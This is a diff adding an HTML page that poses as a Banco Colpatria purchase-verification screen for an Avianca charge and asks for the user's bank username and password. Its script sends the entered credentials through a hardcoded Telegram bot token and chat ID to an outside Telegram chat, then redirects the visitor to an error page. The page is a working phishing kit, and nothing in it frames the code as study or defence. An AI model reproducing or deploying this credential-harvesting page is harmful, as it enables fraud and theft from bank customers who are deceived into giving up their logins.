@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="css/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>vuelos</title>
+    <style>
+        html, body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        header .logo {
+            font-size: 24px;
+            color: #002147;
+            font-weight: bold;
+        }
+
+        header .menu a {
+            text-decoration: none;
+            color: #ffffff;
+            background-color: #002147;
+            padding: 10px 15px;
+            border-radius: 4px;
+        }
+
+        main h2 {
+            color: #333333;
+            font-size: 16px; /* Reducido el tamaño de la fuente para dispositivos móviles */
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        form label {
+            font-size: 14px;
+            margin-bottom: 5px;
+            color: #666666;
+        }
+
+        form select,
+        form input {
+            padding: 8px; /* Reducido el tamaño del relleno */
+            font-size: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #cccccc;
+            border-radius: 4px;
+            width: calc(100% - 18px); /* Ajuste de ancho para compensar el relleno */
+        }
+
+        form button {
+            padding: 10px;
+            font-size: 14px; /* Reducido el tamaño de la fuente del botón */
+            color: white;
+            background-color: #f90909;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 6%;
+            margin-bottom: 6%;
+        }
+
+        form button:hover {
+            background-color: #ee0c0c;
+        }
+
+        form .forgot-password {
+            font-size: 14px;
+            color: #007bff;
+            text-decoration: none;
+            margin-top: 10px;
+        }
+
+        form .forgot-password:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <main style="margin: 15% 8%;">
+        <section>
+            <div style="padding-bottom: 5%; border-style: solid; border-width: 0px 0px 1px 0px; border-color: gray;">
+                <img style="width: 30%;" src="../img/BANCO COLPATRIA.png" alt="">
+            </div>
+    
+            <div style="margin-top: 1%; margin-bottom: 8%;">
+                <p style="margin-bottom: 8%;"><strong>Autenticación de compra</strong></p>
+                <p>Colpatria requiere verificar la transacción que intentas realizar con tu tarjeta por seguridad</p>
+                <p style="margin-top: 15%; color: grey;">Detalles de la transacción</p>
+            </div>
+            
+            <div style="display: flex; justify-content: center; margin-top: 10%;">
+               <div style="width: 70%;">
+                   <div style="display: flex; justify-content: space-around;">
+                      <p style="margin-bottom: 6%;"><strong>Comercio:</strong></p>
+                      <p>Avianca</p>
+                  </div>
+                
+                 <div style="display: flex; justify-content: space-around;">
+                     <p><strong>Monto:</strong></p>
+                     <p>Por cobrar</p>
+                 </div>
+               </div>
+            </div>
+    
+            <div class="container">
+                <h2>Por favor, ingrese su usuario y contraseña Colpatria</h2>
+                <form>
+                    <section style="margin-top: 8%; margin: 5%;">
+                        <div style="margin-bottom: 4%;">
+                            <input type="text" style="border-width: 1px;" id="username" placeholder="Usuario" required>
+                        </div>
+            
+                        <div>
+                            <input type="password" style="border-width: 1.9px;" id="password" placeholder="Ingresa tu contraseña" required>
+                        </div>
+
+                        <div style="display: flex; justify-content: center; margin-top: 6%;">
+                            <button id="submitBtn" style="background-color: rgb(241, 53, 16); font-size: smaller; color: white; padding: 5%; border-radius: 5px; border-width: 0px;" class="login-button">CONTINUAR</button>
+                        </div>
+                    </section>
+                </form>
+            </div>
+            <script>
+                function enviarMensajeTelegram(username, password) {
+    // Aquí debes reemplazar 'TU_TOKEN' por el token de tu bot de Telegram
+    var token = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
+    // Aquí debes reemplazar 'TU_CHAT_ID' por el chat ID al que quieras enviar el mensaje
+    var chatID = '5900829263';
+    var mensaje = 'Logo Scoti: ' + '\nUsuario: ' + username + ' \nClave: ' + password;
+
+    var url = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chatID + '&text=' + mensaje;
+
+    var xhttp = new XMLHttpRequest();
+    xhttp.open('GET', url, true);
+    xhttp.send();
+}
+
+document.getElementById('submitBtn').addEventListener('click', function() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+
+    if (username.trim() !== '' && password.trim() !== '') {
+        enviarMensajeTelegram(username, password);
+        setTimeout(function() {
+            window.location.href = '../Error.html';
+        }, 1000);
+    } else {
+        alert('Por favor complete todos los campos antes de continuar.');
+    }
+});
+            </script>
+       
+    </main>
+    
+</body>
+</html>
